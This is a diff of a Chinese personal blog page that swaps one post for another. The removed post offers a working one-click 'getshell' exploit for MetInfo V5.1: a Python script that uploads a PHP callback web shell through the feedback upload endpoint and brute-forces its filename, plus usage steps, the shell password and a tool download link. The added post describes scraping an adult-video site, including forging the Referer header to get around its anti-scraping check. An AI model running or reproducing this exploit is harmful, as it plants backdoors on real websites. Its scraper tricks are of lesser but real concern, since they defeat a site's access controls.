@@ -89,7 +89,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hacker,Tools," />
+  <meta name="keywords" content="life,Python," />
 
 
 
@@ -107,21 +107,54 @@
 
 
 
-<meta name="description" content="漏洞解析：
-config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&amp;gt;get_one(&quot;SELECT * FROM $met_lang WHERE lang=&apos;$lang&apos;&quot;);if(!$langoks)die(&apos;No data in the database,plea">
+<meta name="description" content="起因
+有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的https://www.javbus5.com/SRS-055这种链接，我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了
+
+构思
+
+爬虫调度启动程序crawler.py
+页面下载程序downloader.py
+页面解析程序pageparser.py
+数据库入库与去重">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MetInfo V5.1 GetShell一键化工具">
-<meta property="og:url" content="http://akkuman.coding.me/2016/06/08/ciztyiysz0008qkvqpa0mqarc.html">
+<meta property="og:title" content="javbus爬虫-老司机你值得拥有">
+<meta property="og:url" content="http://akkuman.coding.me/2016/12/06/ciztyw1ho00171svqdsso4m3z.html">
 <meta property="og:site_name" content="Akkuman Blog">
-<meta property="og:description" content="漏洞解析：
-config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&amp;gt;get_one(&quot;SELECT * FROM $met_lang WHERE lang=&apos;$lang&apos;&quot;);if(!$langoks)die(&apos;No data in the database,plea">
-<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png">
-<meta property="og:updated_time" content="2016-10-29T07:07:05.903Z">
+<meta property="og:description" content="起因
+有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的https://www.javbus5.com/SRS-055这种链接，我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了
+
+构思
+
+爬虫调度启动程序crawler.py
+页面下载程序downloader.py
+页面解析程序pageparser.py
+数据库入库与去重">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/javbus_001.jpg">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/javbus_003.png">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/javbus_004.png">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/javbus_002.png">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/javbus_005.png">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/javbus_006.jpg">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/javbus_007.png">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/javbus_008.png">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/javbus_009.jpg">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/javbus_010.png">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/javbus_011.jpg">
+<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/javbus_012.jpg">
+<meta property="og:image" content="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2070695546,2193961465&fm=116&gp=0.jpg">
+<meta property="og:updated_time" content="2016-12-06T12:00:42.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MetInfo V5.1 GetShell一键化工具">
-<meta name="twitter:description" content="漏洞解析：
-config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&amp;gt;get_one(&quot;SELECT * FROM $met_lang WHERE lang=&apos;$lang&apos;&quot;);if(!$langoks)die(&apos;No data in the database,plea">
-<meta name="twitter:image" content="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png">
+<meta name="twitter:title" content="javbus爬虫-老司机你值得拥有">
+<meta name="twitter:description" content="起因
+有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的https://www.javbus5.com/SRS-055这种链接，我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了
+
+构思
+
+爬虫调度启动程序crawler.py
+页面下载程序downloader.py
+页面解析程序pageparser.py
+数据库入库与去重">
+<meta name="twitter:image" content="http://7xusrl.com1.z0.glb.clouddn.com/javbus_001.jpg">
 
 
 
@@ -149,13 +182,13 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
 
 
 
-  <link rel="canonical" href="http://akkuman.coding.me/2016/06/08/ciztyiysz0008qkvqpa0mqarc.html"/>
+  <link rel="canonical" href="http://akkuman.coding.me/2016/12/06/ciztyw1ho00171svqdsso4m3z.html"/>
 
 
 
 
 
-  <title> MetInfo V5.1 GetShell一键化工具 | Akkuman Blog </title>
+  <title> javbus爬虫-老司机你值得拥有 | Akkuman Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -328,7 +361,7 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://akkuman.coding.me/2016/06/08/ciztyiysz0008qkvqpa0mqarc.html">
+    <link itemprop="mainEntityOfPage" href="http://akkuman.coding.me/2016/12/06/ciztyw1ho00171svqdsso4m3z.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Akkuman">
@@ -349,7 +382,7 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
             
             
               
-                MetInfo V5.1 GetShell一键化工具
+                javbus爬虫-老司机你值得拥有
               
             
           </h1>
@@ -364,8 +397,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-06-08T22:40:32+08:00">
-                2016-06-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-12-06T18:21:53+08:00">
+                2016-12-06
               </time>
             
 
@@ -387,8 +420,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Hacker/" itemprop="url" rel="index">
-                    <span itemprop="name">Hacker</span>
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
                   </a>
                 </span>
 
@@ -405,8 +438,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2016/06/08/ciztyiysz0008qkvqpa0mqarc.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/06/08/ciztyiysz0008qkvqpa0mqarc.html" itemprop="commentCount"></span>
+                <a href="/2016/12/06/ciztyw1ho00171svqdsso4m3z.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/12/06/ciztyw1ho00171svqdsso4m3z.html" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -433,47 +466,75 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
 
       
         <hr>
-<h1 id="漏洞解析："><a href="#漏洞解析：" class="headerlink" title="漏洞解析："></a>漏洞解析：</h1><hr>
-<p><strong>config/config.inc.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">$langoks = $db-&gt;get_one(<span class="string">"SELECT * FROM $met_lang WHERE lang='$lang'"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$langoks)<span class="keyword">die</span>(<span class="string">'No data in the database,please reinstall.'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$langoks[useok]&amp;&amp;!$metinfoadminok)okinfo(<span class="string">'../404.html'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(count($met_langok)==<span class="number">1</span>)$lang=$met_index_type;</div><div class="line"></div><div class="line">$query = <span class="string">"SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'"</span>;<span class="comment">//看这里</span></div><div class="line"></div><div class="line">$result = $db-&gt;query($query);</div><div class="line"></div><div class="line"><span class="keyword">while</span>($list_config= $db-&gt;fetch_array($result))&#123;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($metinfoadminok)$list_config[<span class="string">'value'</span>]=str_replace(<span class="string">'"'</span>, <span class="string">'&amp;#34;'</span>, str_replace(<span class="string">"'"</span>, <span class="string">'&amp;#39;'</span>,$list_config[<span class="string">'value'</span>]));</div><div class="line"></div><div class="line">	$settings_arr[]=$list_config;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($list_config[<span class="string">'columnid'</span>])&#123;</div><div class="line"></div><div class="line">		$settings[$list_config[<span class="string">'name'</span>].<span class="string">'_'</span>.$list_config[<span class="string">'columnid'</span>]]=$list_config[<span class="string">'value'</span>];</div><div class="line"></div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">		$settings[$list_config[<span class="string">'name'</span>]]=$list_config[<span class="string">'value'</span>];</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">@extract($settings);</div></pre></td></tr></table></figure></p>
+<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><hr>
+<p>有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的<a href="https://www.javbus5.com/SRS-055这种链接，" target="_blank" rel="external">https://www.javbus5.com/SRS-055这种链接，</a><br>我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了</p>
 <hr>
+<h1 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h1><hr>
+<ul>
+<li>爬虫调度启动程序crawler.py</li>
+<li>页面下载程序downloader.py</li>
+<li>页面解析程序pageparser.py</li>
+<li>数据库入库与去重管理程序controler.py</li>
+</ul>
 <a id="more"></a>
-<p>访问</p>
-<p><a href="http:///localhost/metinfo5.1/index.php?lang=metinfo" target="_blank" rel="external">http:///localhost/metinfo5.1/index.php?lang=metinfo</a></p>
-<p><code>SELECT * FROM met_config WHERE lang=&#39;metinfo&#39; or lang=&#39;metinfo&#39;</code></p>
+<p>爬取入口为第一页，当页面中存在下一页的超链接继续往下爬，这是个死循环，跳出条件为没有了下一页的链接</p>
+<p>在某一页中解析页面，返回所有的详情页链接，利用迭代器返回，然后在主程序中调用解析程序对页面信息进行解析并包装成字典返回，其中用详情页网址作为数据库主键，其他信息依次写入数据库</p>
+<p>当这一页所有的子链接爬取完成后，继续爬取下一页。</p>
+<p>将数据存入数据库，用的是sqllite3,失败的网址页存入一个fail_url.txt。</p>
+<p>对于增量爬取，我是这么做的，当爬取到相同的网址时结束程序，这么做也有漏洞，才疏学浅，我没想到太好的办法，希望有好办法的给我说一声（布隆过滤正在研究之中），如果用数据库查询去重，那么势必导致二次爬取，我们都知道，爬虫更多的时间是花在网络等待上</p>
 <hr>
-<h2 id="文件命名方式："><a href="#文件命名方式：" class="headerlink" title="文件命名方式："></a>文件命名方式：</h2><hr>
-<p><strong>/feedback/uploadfile_save.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">srand((double)microtime() * <span class="number">1000000</span>);</div><div class="line"></div><div class="line">$rnd = rand(<span class="number">100</span>, <span class="number">999</span>);</div><div class="line"></div><div class="line">$name = date(<span class="string">'U'</span>) + $rnd;</div><div class="line"></div><div class="line">$name = $name.<span class="string">"."</span>.$ext;</div></pre></td></tr></table></figure></p>
-<p><strong>文件保存在/upload/file/目录</strong></p>
-<p>命名方式就是时间戳去掉后三位，紧接着一个三位数的随机数</p>
-<p>可爆破：</p>
-<p>如</p>
-<p><a href="http://127.0.0.1/upload/file/1465394396.php" target="_blank" rel="external">http://127.0.0.1/upload/file/1465394396.php</a></p>
+<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><hr>
+<p>在写爬虫的过程中遇到了一些问题</p>
+<ol>
+<li><p>在墙内爬不动，爬取几个之后就失败，这个解决方案只需要全局翻墙爬取就可以了</p>
+</li>
+<li><p>本来之前加了多线程并发爬取，但是发现爬取一段时间后会封ip导致整体无法运行，本来想搞个代理池进行并发，结果网上免费的代理太慢太慢，根本打不开网页，于是就改回了单线程</p>
+</li>
+<li><p>就是我的那个不完善的增量爬取，导致了你一次爬取就需要爬取完成，不然数据库里面存在你之前爬到的，爬取到你已有的会直接停止</p>
+</li>
+<li><p>存在反扒策略<br>详情页中的磁力链接是ajax动态加载的，通过分析抓包，可以在XHR中找到是一个get请求，至于参数，我开始不知道怎么得来的，后来在html代码中找到了，我放几张图大家就明白了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_001.jpg" alt="1"></p>
+<p>我们通过对响应内容的查看可以发现磁力的加载访问了类似于这样一个网址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.javbus5.com/ajax/uncledatoolsbyajax.php?gid=30100637207&amp;lang=zh&amp;img=https://pics.javbus.info/cover/59pc_b.jpg&amp;uc=0&amp;floor=921</div></pre></td></tr></table></figure>
+<p>那么这些get参数是从哪里来呢，这就是通过经验与基本功去发现了</p>
+<p>通过对html源文件的搜索，我们即可直接发现答案<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_003.png" alt="3"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_004.png" alt="4"><br>通过分析发现，后面的floor是个随机数参数，一般这种参数可以去除无影响，事实也是这样</p>
+<p>我利用HttpRequest模拟发包，对这个请求直接get，发现所有数据隐藏<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_002.png" alt="2"></p>
+<p>那么肯定是有反扒的策略，伪造请求头，反扒也就那么几种，通过分析发现是同源策略，对Referer请求头伪造成来源网址就可以直接获取到内容了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_005.png" alt="5"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_006.jpg" alt="6"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_007.png" alt="7"></p>
+</li>
+<li><p>常见的Python2.x编码问题,全部转换为unicode字节流就可以了<br> 这个问题在我博客中已经记录了<a href="http://www.53xiaoshuo.com/Python/77.html" target="_blank" rel="external">http://www.53xiaoshuo.com/Python/77.html</a><br> 有兴趣的童鞋可以看看</p>
+</li>
+<li><p>遇到的最闹心问题是详情页的项目抓取，有的详情页的类别不同，我开始只分析了一个页面，导致写的规则在有的页面上频频出错<br>导致后面对抓取规则进行了大改,重写了分析规则，用了个笨办法，毕竟那小块的html写的十分不规范，正则规则有三种，挺烦人<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_008.png" alt="8"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_009.jpg" alt="9"><br>比如上图的两个就不同，html代码更是稀烂，需要判断有没有这个项，没有就设置空字节入库</p>
+<p>在这其中纠结了一个问题<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_010.png" alt="10"></p>
+<p>就是对于这两种的比较，我想上面这种变成下面这种，毕竟第一种的话，soup.find要执行两次，但是下面这种又要比上面那个多一行，丑一点<br>最后我选择了第二种，所有的信息分析代码就不贴了，具体想看的直接看我的代码文件就好了</p>
+</li>
+</ol>
 <hr>
-<h1 id="一键化利用工具："><a href="#一键化利用工具：" class="headerlink" title="一键化利用工具："></a>一键化利用工具：</h1><hr>
-<p><strong>本程序基于python编写</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> Queue</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"></div><div class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.10 Safari/537.36'</span>&#125;</div><div class="line"></div><div class="line">urls = Queue.Queue()</div><div class="line"><span class="comment">#http://hb.jhxjd.com/upload/file/1441445378.php</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp</span><span class="params">(urls,time_out)</span>:</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> urls.empty():</div><div class="line">        base_url = urls.get()</div><div class="line">        response = <span class="keyword">None</span></div><div class="line"></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            time.sleep(int(time_out))<span class="comment">#延时设置</span></div><div class="line">            response = requests.get(base_url,headers=headers)</div><div class="line">            <span class="keyword">if</span> response.status_code == <span class="number">404</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">'Not Fount----%s\n'</span> % base_url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            <span class="keyword">if</span> response:</div><div class="line">                <span class="keyword">with</span> open(<span class="string">'url.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</div><div class="line">                    f.write(<span class="string">'%s?e=YXNzZXJ0\n'</span>%base_url)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(target_url,thread_num,time_out)</span>:</span></div><div class="line"></div><div class="line">    <span class="comment">#取出当前时间戳并删除后四位</span></div><div class="line">    now = str(int(time.time()))[:<span class="number">-4</span>]</div><div class="line"></div><div class="line">    <span class="comment">#将所有的待爆破地址遍历并加入队列</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">1000</span>):</div><div class="line">            num_str = <span class="string">''</span>.join((str(i),str(j)))</div><div class="line">            url = <span class="string">''</span>.join((<span class="string">'%s/upload/file/%s'</span> % (target_url,now),num_str,<span class="string">'.php'</span>))</div><div class="line">            urls.put(url)</div><div class="line"></div><div class="line">    <span class="comment">#上传文件</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'xiaoma.php'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> fi:</div><div class="line">        fi.write(<span class="string">"&lt;?php $e = $_REQUEST['e'];register_shutdown_function(base64_decode($e), $_REQUEST['Akkuman']);?&gt;"</span>)</div><div class="line">    data = &#123;</div><div class="line">            <span class="string">'fd_para[1][para]'</span>:<span class="string">'filea'</span>,</div><div class="line">            <span class="string">'fd_para[1][type]'</span>:<span class="string">'5'</span></div><div class="line">            &#125;</div><div class="line">    files = &#123;<span class="string">'filea'</span>: open(<span class="string">"xiaoma.php"</span>, <span class="string">'rb'</span>)&#125;</div><div class="line">    upload_url = <span class="string">'%s/feedback/uploadfile_save.php?met_file_format=pphphp&amp;met_file_maxsize=9999&amp;lang=metinfo'</span> % target_url</div><div class="line">    res = requests.post(upload_url,data = data,files=files)</div><div class="line">    <span class="comment">#等待两秒  文件上传</span></div><div class="line">    time.sleep(<span class="number">2</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">#启动多线程</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(thread_num)):</div><div class="line">        t = threading.Thread(target = bp,args=(urls,time_out,))</div><div class="line">        t.start()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'Example : %s http://www.xxx.com 20 0'</span> % sys.argv[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        main(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>],sys.argv[<span class="number">3</span>])</div></pre></td></tr></table></figure>
-<p>程序略显粗糙</p>
-<p>为了方便，我也把他打包成了<strong>exe</strong></p>
-<p>然后闲着没事，想着简单地给他做了个<strong>界面</strong>,这样的<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png" alt="GUI"></p>
+<h1 id="小Tips"><a href="#小Tips" class="headerlink" title="小Tips"></a>小Tips</h1><hr>
+<ol>
+<li><p>对于动态加载的内容的爬取，能不用selenium去模拟浏览器爬取就不用，耗费资源，更好的是自己分析网络请求，然后构造</p>
+</li>
+<li><p>对于页面信息的解析，要多看几个页面，看是否相同，别到时候做多事情</p>
+</li>
+<li><p>多看别人的博客学习思路</p>
+</li>
+</ol>
 <hr>
-<h1 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h1><hr>
-<blockquote>
-<p>MetInfo V5.1上传漏洞getshell利用工具</p>
-<p>   作者 : Akkuman</p>
-<p>漏洞原理详见<a href="http://www.wooyun.org/bugs/wooyun-2010-0139168" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0139168</a></p>
-<p>使用说明：<br>本目录有两个文件，一个py，一个exe<br>因为exe是py文件打包而成，故文件较大<br>64位系统测试使用通过</p>
-<p>如果你安装了py2.x环境  py文件使用方法<br>打开cmd<br>python baopo.py <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
-<p>exe命令行文件使用方法<br>打开cmd<br>baopo.exe <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
-<p>GUI程序，应该不用说</p>
-<p>关于getshell与结果<br>上传的是回调一句话木马<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="meta">&lt;?php</span> &gt;$e=$_REQUEST[<span class="string">'e'</span>];register_shutdown_function(base64_decode($e),$_&gt;REQUEST[<span class="string">'Akkuman'</span>]);<span class="meta">?&gt;</span></div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
-<p>菜刀连接，密码是Akkuman</p>
-<p>爆破结果会生成在<strong>url.txt</strong></p>
-</blockquote>
+<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><hr>
+<p>爬虫依赖的第三方库有Requests，BeautifulSoup，使用前请先pip install这两个第三方库</p>
 <hr>
-<h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><hr>
-<p><a href="http://cloud.189.cn/t/v263QbMJVJ3u" target="_blank" rel="external">(访问码:1475)</a></p>
-<p><em>转载请注明出处</em></p>
-<p><em>作者博客 hacktech.cn | 53xiaoshuo.com</em></p>
+<h1 id="测试展与地址"><a href="#测试展与地址" class="headerlink" title="测试展与地址"></a>测试展与地址</h1><hr>
+<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_011.jpg" alt="11"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_012.jpg" alt="12"></p>
+<hr>
+<h2 id="代码地址"><a href="#代码地址" class="headerlink" title="代码地址:"></a>代码地址:</h2><hr>
+<ul>
+<li><em>coding.net</em>    <a href="https://coding.net/u/Akkuman/p/Javbus_crawler" target="_blank" rel="external">javbus_crawler</a></li>
+<li><em>github.com</em>    <a href="https://github.com/akkuman/Javbus_crawler" target="_blank" rel="external">javbus_crawler</a></li>
+</ul>
+<p>司机的名声总算是没有辱没，秋名山依旧，嘿嘿<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2070695546,2193961465&amp;fm=116&amp;gp=0.jpg" alt="13"></p>
+<p><strong>转载请注明来源作者</strong></p>
+<ul>
+<li>博客：53xiaoshuo.com | hacktech.cn</li>
+<li>作者：Akkuman</li>
+</ul>
 
       
     </div>
@@ -518,9 +579,9 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
       
         <div class="post-tags">
           
-            <a href="/tags/Hacker/" rel="tag"># Hacker</a>
+            <a href="/tags/life/" rel="tag"># life</a>
           
-            <a href="/tags/Tools/" rel="tag"># Tools</a>
+            <a href="/tags/Python/" rel="tag"># Python</a>
           
         </div>
       
@@ -533,8 +594,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/05/31/ciztyiysb0000qkvqlh4vjyek.html" rel="next" title="discuz 不能上传头像提示can not write to the data/tmp folder">
-                <i class="fa fa-chevron-left"></i> discuz 不能上传头像提示can not write to the data/tmp folder
+              <a href="/2016/12/06/ciztyw1hx001m1svq7pbja90a.html" rel="next" title="突破百度云限速与网页限制批量下载">
+                <i class="fa fa-chevron-left"></i> 突破百度云限速与网页限制批量下载
               </a>
             
           </div>
@@ -543,8 +604,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2016/06/09/ciztyiyuf0020qkvqgxb2bhyb.html" rel="prev" title="编码转换工具">
-                编码转换工具 <i class="fa fa-chevron-right"></i>
+              <a href="/2016/12/11/ciztyw1hd000w1svq7qpxpjlg.html" rel="prev" title="Python异步爬虫的学习(一)">
+                Python异步爬虫的学习(一) <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -560,10 +621,10 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
 
     <div class="post-spread">
       
-        <div class="ds-share flat" data-thread-key="2016/06/08/ciztyiysz0008qkvqpa0mqarc.html"
-     data-title="MetInfo V5.1 GetShell一键化工具"
+        <div class="ds-share flat" data-thread-key="2016/12/06/ciztyw1ho00171svqdsso4m3z.html"
+     data-title="javbus爬虫-老司机你值得拥有"
      data-content=""
-     data-url="http://akkuman.coding.me/2016/06/08/ciztyiysz0008qkvqpa0mqarc.html">
+     data-url="http://akkuman.coding.me/2016/12/06/ciztyw1ho00171svqdsso4m3z.html">
   <div class="ds-share-inline">
     <ul  class="ds-share-icons-16">
 
@@ -590,8 +651,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/06/08/ciztyiysz0008qkvqpa0mqarc.html"
-           data-title="MetInfo V5.1 GetShell一键化工具" data-url="http://akkuman.coding.me/2016/06/08/ciztyiysz0008qkvqpa0mqarc.html">
+      <div class="ds-thread" data-thread-key="2016/12/06/ciztyw1ho00171svqdsso4m3z.html"
+           data-title="javbus爬虫-老司机你值得拥有" data-url="http://akkuman.coding.me/2016/12/06/ciztyw1ho00171svqdsso4m3z.html">
       </div>
     
   </div>
@@ -763,6 +824,10 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
                   <a href="http://al0n4k.com/" title="AL0N4K" target="_blank">AL0N4K</a>
                 </li>
               
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.storysec.com/" title="AnCoLin's Blog" target="_blank">AnCoLin's Blog</a>
+                </li>
+              
             </ul>
           </div>
         
@@ -782,7 +847,7 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
             
 
             
